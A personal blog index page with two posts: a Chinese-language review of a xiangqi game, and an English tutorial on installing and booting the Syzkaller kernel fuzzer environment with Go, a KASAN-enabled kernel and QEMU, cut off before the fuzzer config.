<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","width":500,"display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/3/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/08/delicious/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/08/delicious/" class="post-title-link" itemprop="url">顺炮直车对横车 红过河车 复盘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-08 03:00:00 / Modified: 03:36:21" itemprop="dateCreated datePublished" datetime="2025-04-08T03:00:00+08:00">2025-04-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="象棋复盘-顺炮直车对横车-红过河车"><a href="#象棋复盘-顺炮直车对横车-红过河车" class="headerlink" title="[象棋复盘] 顺炮直车对横车 红过河车"></a>[象棋复盘] 顺炮直车对横车 红过河车</h1><h2 id="对局记录"><a href="#对局记录" class="headerlink" title="对局记录"></a>对局记录</h2><ol>
<li><p>炮二平五 炮８平５</p>
</li>
<li><p>马二进三 马８进７</p>
</li>
<li><p>车一平二 车９进１</p>
</li>
<li><p>车二进六 车９平４</p>
</li>
<li><p>仕四进五 车４进７</p>
</li>
<li><p>马八进九 车４平２</p>
</li>
<li><p>炮八平六 车１进１</p>
</li>
<li><p>炮六进五 炮５退１</p>
</li>
<li><p>车二平三 炮５平７</p>
</li>
<li><p>车三平四 士４进５</p>
</li>
<li><p>炮六退三 车１平４</p>
</li>
<li><p>炮六平三 炮７进４</p>
</li>
<li><p>兵三进一 车４进３</p>
</li>
<li><p>兵七进一 象３进５</p>
</li>
<li><p>马九进七 车２退２</p>
</li>
<li><p>马七进五 车４平６</p>
</li>
<li><p>兵三进一 车６退１</p>
</li>
<li><p>马五进四 车２退２</p>
</li>
<li><p>马四进三 将５平４</p>
</li>
<li><p>炮五平六 炮２退１</p>
</li>
<li><p>前马进一 象５进７</p>
</li>
<li><p>马三进四 将４平５</p>
</li>
<li><p>炮六平三 象７退５</p>
</li>
<li><p>相三进五 炮２平３</p>
</li>
<li><p>相七进九 马２进３</p>
</li>
<li><p>兵九进一 车２平６</p>
</li>
</ol>
<h2 id="复盘分析"><a href="#复盘分析" class="headerlink" title="复盘分析"></a>复盘分析</h2><ol>
<li>炮二平五 炮８平５</li>
<li>马二进三 马８进７</li>
<li>车一平二 车９进１</li>
<li>车二进六 车９平４</li>
<li>仕四进五 车４进７</li>
<li>马八进九  …</li>
</ol>
<blockquote>
<p>到此双方走的都是正着，这里红走了一边马，害怕上正马被黑车平抠</p>
<p>实际上红完全可以上正马，当黑平车抠马时红左炮巡河暗保马，如果黑吃马, 红就有炮八平七打车打底象的双响炮</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408002348491.png" alt="image-20250408002348491"></p>
</blockquote>
<ol start="6">
<li>…  车４平２</li>
</ol>
<blockquote>
<p>黑方左车急得跟马一样钻到红方被窝里，目的是单边封锁</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408001958158.png" alt="image-20250408001958158"></p>
<p>黑方捉炮同时单边封锁红左车。然而此时红方不怕封锁，可以直接出左直车邀兑，看似会多丢一批马，但是实际上是一个先弃后取，黑右炮打出使得左马脱根，黑左马是个死马。推演如下：</p>
<p>7.车九平八 车2进1</p>
<p>8.马九退八 炮2进7  ，这里黑方大概率会打马，因为黑车已经千里迢迢报废了，步数上血亏，因此杀个马获取补偿</p>
<p>9.车二平三 马7退8 ， 如果黑马退窝心则铁门栓速摆，如果黑马7退9则红炮五进四，士4进5，炮八进六，黑马被捉死</p>
<p>10.车三进三 马8进9</p>
<p>11.炮五进四 士4进5</p>
<p>12.帅五平四 将5平4 ，红借帅做铁门栓，逼迫黑将出门</p>
<p>13.炮五进二，至此红方少一个马，但是黑方家里已经被拆烂了，黑方守不住</p>
<p>这个布局陷阱在 布局疑形与攻击 - 第一章 顺手炮类 - 第10局 突发冷箭</p>
</blockquote>
<ol start="7">
<li>炮八平六 车１进１</li>
</ol>
<blockquote>
<p>这里红方看似简单躲了一步炮，实际上是想再进五打马，让黑中卒失守，再把中炮打过去</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408004926239.png" alt="image-20250408004926239"></p>
<p>我当时没考虑到这种意图，走车1进1，打算再平6出车，实际上这步出车也没有明确的目的。红可以车二平三压马，后续可以套炮或者进三兵攻击黑7路，黑左车不在家防守，黑7路将会十分被动。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408005829699.png" alt="image-20250408005829699"></p>
<p>因此此时黑最好应该走卒7进1，此时如果红还要车二平三压马，那么黑正好有时间抬横车平4然后伺机巡河守住，红来不及升巡河炮，红进三兵也可以被黑车象一起守住</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408010144595.png" alt="image-20250408010144595"></p>
<p>还有一个问题是，在第6回合这里，黑方能否走马2进1？显然不能了，道理和走车1进1一样，缓一步棋使得7路马更加被动，并且车还没出来没法过去支援，更加被动</p>
</blockquote>
<ol start="8">
<li>炮六进五 炮５退１</li>
</ol>
<blockquote>
<p>当红炮六进五突袭后，吓我一跳。</p>
<p>当时想了三个应发，分别是士4进5&#x2F;车1平4&#x2F;炮5退1</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408010835895.png" alt="image-20250408010835895"></p>
<p>（1） 士4进5</p>
<ol start="8">
<li><p>炮六进五 士4进5</p>
</li>
<li><p>炮六平三 炮2平7</p>
</li>
<li><p>车二平三 炮7平6</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408025634437.png" alt="image-20250408025634437"></p>
<p>到此黑方的单边封锁失败，中卒和底象都失守，显然红优</p>
<p>（2）车1平4</p>
<ol start="8">
<li><p>炮六进五 车1平4</p>
</li>
<li><p>炮六平三 炮2平7</p>
</li>
<li><p>车二平三 炮7退1</p>
</li>
<li><p>炮五进四 炮7平5</p>
</li>
<li><p>炮五进二 车2平4 ，铁门栓抢一步先手，形成霸王车</p>
</li>
<li><p>相三进五 士4进5</p>
</li>
<li><p>马三退四 后车进2 ， 目的是兑车保护卒林</p>
</li>
<li><p>车三平六 车4退5</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408012359252.png" alt="image-20250408012359252"></p>
</li>
</ol>
<p>接下来红出直车先手抓马，红有多两个兵的优势。但是感觉大概率是和棋了</p>
</blockquote>
<ol start="9">
<li>车二平三 炮５平７</li>
</ol>
<blockquote>
<p>红方此时杀卒压马是错着，黑恰好可以炮5平7打车，红方失先</p>
</blockquote>
<ol start="10">
<li>车三平四 士４进５</li>
</ol>
<blockquote>
<p>红车三平四之后，此时是黑方最关键的一步棋，当时想到了四种走法：</p>
<p>士4进5&#x2F;马7进8&#x2F;炮7进5&#x2F;车1平4</p>
<p>士4进5很平庸，不至于失败，但是依旧消极防御</p>
<p>炮7进5&#x2F;马7进8&#x2F;车1平4都是有力的反击，能够化解红方的攻势</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408013139080.png" alt="image-20250408013139080"></p>
<p>（1）士4进5，目的是驱赶红炮，同时补厚中路。也正是实战中我走出的一步。但是没有对冲红方的攻势，仍然在消极防御。</p>
<p>（2）马7进8，当时没敢走这一步，害怕此步导致中卒失守，红直接弃车炮五进四，眼见就要重炮杀，黑马还对退回盯住红后炮，或者黑需要上将解杀。</p>
<p>然而黑方此时有一步妙手可以解决红方重炮攻势，并让红方立刻被动：</p>
<p>炮2进1，拉住红方车炮，要求兑炮</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408014655790.png" alt="image-20250408014655790"></p>
<p>实战没有看到这步，没走出来</p>
<p>（3）炮7进5，实战中也没走出这步来，也是忌惮红方中路的强大攻势，没看到炮2进1能够化解重炮杀</p>
<ol start="10">
<li><p>车三平四 炮7进5</p>
</li>
<li><p>车四平三 炮7进3</p>
</li>
<li><p>马三进四 炮7平9</p>
</li>
<li><p>马四进五 马7进5</p>
</li>
<li><p>炮五进四 炮2进1</p>
</li>
</ol>
<p>（4）车1平4，实战中也没走出这步来，还是忌惮红方中路的强大攻势，害怕被安上空头炮</p>
<p>具体说就是害怕红炮六平四蹩马腿，下一步炮五进四做重炮。然而这里黑方可以直接士4进5，炮五进四，士5进6得子，黑弃空头得一炮，红方左车未出，有空头也无可奈何，弃子不成立。</p>
<p>因此黑车1平4后红唯一正手是炮六退五，黑马2进3，跳起屏风马，并且7路随时反击，红中路攻势受阻，红六路炮进而又退，无功而返。黑方反先。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408020707632.png" alt="image-20250408020707632"></p>
</blockquote>
<ol start="11">
<li><p>炮六退三 车１平４</p>
</li>
<li><p>炮六平三 炮７进４</p>
</li>
<li><p>兵三进一 车４进３</p>
</li>
</ol>
<blockquote>
<p>此处黑车应该巡河还是骑河，我寻思了半天终于一口气走错了</p>
<p>我寻思巡河防止红三兵过河压马，但是太过被动</p>
<p>但是骑河也能做到，等红三兵过河后立刻跟在后面同时抓马，效果要比巡河主动。同时可以避免红再冲七兵。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408021507000.png" alt="image-20250408021507000"></p>
<p>巡河太过软弱，使得红兵得以七进一然后上马，红也可以马三进四蹬巡河车。</p>
</blockquote>
<ol start="14">
<li><p>兵七进一 象３进５</p>
</li>
<li><p>马九进七 车２退２</p>
</li>
</ol>
<blockquote>
<p>这里红方仓促马九进七，实际上后面会被黑车追亡逐北。</p>
<p>这里红方正手是马三进四，正好蹬一脚黑巡河车</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408022000471.png" alt="image-20250408022000471"></p>
</blockquote>
<ol start="16">
<li>马七进五 车４平６</li>
</ol>
<blockquote>
<p>黑车4平6是整盘棋最臭的一步</p>
<p>当时我的想法是要求兑车，红车先杀黑车，然后黑马顺势前进，但是红车有根他不慌，红先兵三进一过河，这兵祖宗一下就令我汗流浃背了。原来平车邀兑全都是我的一厢情愿，小丑竟是我自己。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408022547827.png" alt="image-20250408022547827"></p>
<p>那么这里黑棋应该怎么走？</p>
<p>有马2进4和卒5进1两种</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408023811608.png" alt="image-20250408023811608"></p>
<p>卒5进1，红马可以大胆马五进三，如白驹过隙，接下来后马、中炮、三兵都可以参战，攻势汹涌。黑方难以防御。这步进卒只爽了一时顶顶马，但是中卒脱根给了红方中炮当头的机会。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408024123427.png" alt="image-20250408024123427"></p>
<p>马2进4，防守住3卒和中卒，此时红要是再马五进三就不合适了，推演如下：</p>
<ol start="16">
<li>马七进五 马2进4</li>
<li>马五进三 车4退1</li>
<li>相三进一 车4平3</li>
</ol>
<p>接下来红前马没有好去处，要么就换掉中卒，趋向和棋</p>
</blockquote>
<p>从黑方这步臭棋之后，两位厨师长也是礼尚往来，只有更臭</p>
<ol start="17">
<li><p>兵三进一 车６退１</p>
</li>
<li><p>马五进四 车２退２</p>
</li>
</ol>
<blockquote>
<p>这个车2退2更臭，可以说黑方双手离开方向盘了</p>
<p>我当时想的是我2路仍然封锁着红车，它一时半会儿出不来，确实直车是一时半会儿出不来，但是横车两步就到我家门口！</p>
<p>我寻思红应该急于求成先走卧槽将军爽一下，这样我出个将就一点事都没有。然而红出个横车黑方立刻就无了。</p>
<p>然而对面水平也和我一样臭，他真就先卧槽爽爽，然后看我将5平4，于是炮五平六给我打招呼，</p>
<p>我说哥们缺个炮架不，他说你看我三马上来将不将你就完了。三马上来还得两步，主打一个松弛感。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408025153253.png" alt="image-20250408025153253"></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/12/21/syzkaller%20I/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/21/syzkaller%20I/" class="post-title-link" itemprop="url">Syzkaller I - Get start</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-12-21 21:09:00 / Modified: 21:30:19" itemprop="dateCreated datePublished" datetime="2024-12-21T21:09:00+08:00">2024-12-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Syzkaller-I-Get-start"><a href="#Syzkaller-I-Get-start" class="headerlink" title="[Syzkaller I]Get start"></a>[Syzkaller I]Get start</h1><blockquote>
<p>Syzkaller is the start-of-the-art kernel fuzzer.</p>
<p>Syzkaller takes in a collection of syscall descriptions provided by human experts as template , which provide the fuzzer awareness of the type and arguments of syscalls to be called and dependencies between syscalls . Then the fuzzer randomly generates test cases based on the template , start a kernel to run the test cases , meanwhile monitor the kernel state and collect crash reports.</p>
</blockquote>
<h2 id="0x0-TL-DR"><a href="#0x0-TL-DR" class="headerlink" title="0x0 TL;DR"></a>0x0 TL;DR</h2><p>This post will take a look at the Syzkaller environment setup , and I will provide an ez demo to report a heap overflow in a kernel module. Hopefully my time consuming debugging process can help you . Let’s go.</p>
<h2 id="0x1-setup"><a href="#0x1-setup" class="headerlink" title="0x1 setup"></a>0x1 setup</h2><h3 id="0-enable-cpu-feature-kvm"><a href="#0-enable-cpu-feature-kvm" class="headerlink" title="0.enable cpu feature kvm"></a>0.enable cpu feature kvm</h3><p>inspect the cpuinfo to make sure cpu support the kvm feature</p>
<ul>
<li>for intel:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&quot;vmx&quot;</span> </span><br></pre></td></tr></table></figure>

<ul>
<li>for AMD:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&quot;svm&quot;</span> </span><br></pre></td></tr></table></figure>



<h3 id="1-setup-golang-environment"><a href="#1-setup-golang-environment" class="headerlink" title="1.setup golang environment"></a>1.setup golang environment</h3><blockquote>
<p>Golang version is 1.23.4 up to that time.</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.23.4.linux-amd64.tar.gz</span><br><span class="line">tar -xzf go1.23.4.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p>add Gopath to environment</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GOROOT=/path/to/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOROOT</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p>run <code>go version</code> to check Golang environment</p>
<h3 id="2-build-Syzkaller"><a href="#2-build-Syzkaller" class="headerlink" title="2.build Syzkaller"></a>2.build Syzkaller</h3><blockquote>
<p>ensure your golang environment</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/syzkaller/</span><br><span class="line"><span class="built_in">cd</span> syzkaller</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h3 id="3-compile-Linux-kernel"><a href="#3-compile-Linux-kernel" class="headerlink" title="3.compile Linux kernel"></a>3.compile Linux kernel</h3><p>take Linux 5.14 for example</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.14.tar.xz</span><br><span class="line">tar -xf linux-5.14.tar.xz</span><br><span class="line"><span class="built_in">cd</span> linux-5.14</span><br><span class="line">make defconfig</span><br></pre></td></tr></table></figure>

<p>then append the following CONFIGS to .config</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_KCOV_INSTRUMENT_ALL=y</span><br><span class="line">CONFIG_KCOV_ENABLE_COMPARISONS=y</span><br><span class="line">CONFIG_DEBUG_FS=y</span><br><span class="line">CONFIG_DEBUG_KMEMLEAK=y</span><br><span class="line">CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT=y</span><br><span class="line">CONFIG_KALLSYMS=y</span><br><span class="line">CONFIG_KALLSYMS_ALL=y</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br><span class="line">CONFIG_NAMESPACES=y</span><br><span class="line">CONFIG_UTS_NS=y</span><br><span class="line">CONFIG_IPC_NS=y</span><br><span class="line">CONFIG_PID_NS=y</span><br><span class="line">CONFIG_NET_NS=y</span><br><span class="line">CONFIG_CGROUP_PIDS=y</span><br><span class="line">CONFIG_MEMCG=y</span><br><span class="line">CONFIG_CMDLINE_BOOL=y</span><br><span class="line">CONFIG_CMDLINE=&quot;net.ifnames=0&quot;</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br></pre></td></tr></table></figure>

<blockquote>
<p>more configs : </p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md">https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md</a></p>
</blockquote>
<p>the compile the kernel</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j `nproc`</span><br></pre></td></tr></table></figure>

<p>this will take for a while when you get a bootable kernel image .</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file ./arch/x86/boot/bzImage </span><br></pre></td></tr></table></figure>

<h3 id="4-build-virtual-hard-disk"><a href="#4-build-virtual-hard-disk" class="headerlink" title="4.build virtual hard disk"></a>4.build virtual hard disk</h3><p>to build a disk image with MBR and basic file system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">mkdir image</span><br><span class="line">cp ./tools/create-image.sh ./image</span><br><span class="line">cd image</span><br><span class="line">./create-image.sh</span><br></pre></td></tr></table></figure>

<p>this will take for a while when you get bullseye.img as the disk image and two ssh key file</p>
<blockquote>
<p>bullseye is the release name of Debian up to that time.</p>
</blockquote>
<h3 id="5-build-QEMU"><a href="#5-build-QEMU" class="headerlink" title="5.build QEMU"></a>5.build QEMU</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install qemu-system</span><br></pre></td></tr></table></figure>

<h3 id="6-run-the-kernel"><a href="#6-run-the-kernel" class="headerlink" title="6.run the kernel"></a>6.run the kernel</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 2G \</span><br><span class="line">    -smp 2 \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -kernel /path/to/linux-5.14/arch/x86/boot/bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \</span><br><span class="line">    -drive file=/path/to/syzkaller/image/bullseye.img,format=raw \</span><br><span class="line">    -net user,hostfwd=tcp:127.0.0.1:10021-:22 \</span><br><span class="line">    -net nic,model=e1000 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -nographic \</span><br><span class="line">    -pidfile vm.pid 2&gt;&amp;1 | <span class="built_in">tee</span> vm.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Login as root without password</p>
<blockquote>
<p>errors :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">network backend &#x27;user&#x27; is not compiled into this binary</span><br></pre></td></tr></table></figure>

<p>check this post :</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/75641274/network-backend-user-is-not-compiled-into-this-binary">https://stackoverflow.com/questions/75641274/network-backend-user-is-not-compiled-into-this-binary</a></p>
</blockquote>
<p>then make sure ssh is avaliable</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ./image/bullseye.id_rsa -p 10021 -o <span class="string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost</span><br></pre></td></tr></table></figure>

<h3 id="7-start-SyzKaller"><a href="#7-start-SyzKaller" class="headerlink" title="7.start SyzKaller"></a>7.start SyzKaller</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/syzkaller</span><br><span class="line"><span class="built_in">mkdir</span> workdir</span><br></pre></td></tr></table></figure>

<p>and edit a config file saved as default.cfg</p>
